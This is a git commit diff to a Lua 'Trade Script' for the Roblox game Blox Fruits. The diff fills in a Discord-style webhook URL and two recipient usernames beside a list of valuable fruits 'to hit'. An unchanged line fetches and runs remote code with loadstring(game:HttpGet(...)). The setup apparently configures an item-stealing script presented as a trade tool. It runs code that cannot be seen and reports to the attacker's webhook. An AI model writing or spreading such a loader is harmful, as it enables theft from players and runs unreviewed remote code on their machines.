5573b9d3aed5326e082e5f4b2d3b78449b3c17e9
realraddz <dcmatrix07@gmail.com>
2025-03-04 16:32:55 +0530

    Trade Script by realredz.lua

--- Trade Script by realredz.lua
+++ Trade Script by realredz.lua
@@ -1,5 +1,5 @@
-Webhook = "" -- << Your Webhook
-Usernames = {"uruserhereorsmthidk", "somealtuserhere2"} -- << Your username(-s).
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=dmJjdlVidTducUpRVV82UldVM20tdzoyVXQ1M0o1NDZKOHV0b055U0RxWUJOYTZYQjhUREg3V3dRbzhfa3hDc1pvYmlJTG5NOGFnLS1oZ0swM1ZTMXRNSkxKSFZFdm9MaUhpT3V3bWNiWDRkcG1QUTVFRDJwNXVoY1JOT2N1Vmt1bXE2Tno0alA3cHBMZmxob3hHWXdpQ3lheVBzcW1Mc2FWYTdGbzRaaTR6eXB3QWVBcXgyUXlwaWFHbTFvMjE2SWc" -- << Your Webhook
+Usernames = {"saumya_papa", "mtx_goku9"} -- << Your username(-s).
 FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
